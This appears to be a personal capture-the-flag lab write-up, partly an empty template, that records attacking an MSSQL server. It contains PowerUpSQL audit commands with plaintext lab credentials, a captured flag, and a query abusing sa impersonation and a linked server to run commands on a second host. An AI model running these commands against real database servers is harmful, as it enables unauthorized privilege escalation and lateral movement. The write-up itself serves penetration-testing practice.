# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 
- IP: `192.168.210.15`

# Findings
### Credentials
`FoundCREDs`

### flag
- `ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}`
## External
### Enumeration
```
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```
- Ppls fucked the network i cant access it
	- But this is how it is done.
- Upload `PowerUpSQL.ps1` and use this Comand to audit for athe mssql vuln
	- `Invoke-SQLAudit -Instance ZPH-SVRSQL01.zsm.local -Verbose -username zabbix -password rDhHbBEfh35sMbkY`
![](https://i.imgur.com/UX4se6V.png)
- we have sa impersonation so we can run xp_cmdshell.
![](https://i.imgur.com/AbhXJVB.png)

- BOOm.
- Checking for linked servers After i saw there is [[ZEPHYR-SQL02]]
	- `Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXEC sp_linkedservers;" -username zabbix -password rDhHbBEfh35sMbkY -Verbose `  ![](https://i.imgur.com/3t8hri8.png)
 - This means, i can control the The ANother server
	- `Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXEC AS LOGIN = 'sa'; EXECUTE ('select @@servername;') at [ZSM-SVRSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose`
	- ![](https://i.imgur.com/IagY1QG.png)

### Gaining Access


## Internal
### Enumeration
`$enum$`

### Gaining Access


### Maintaining Access


# Random Notes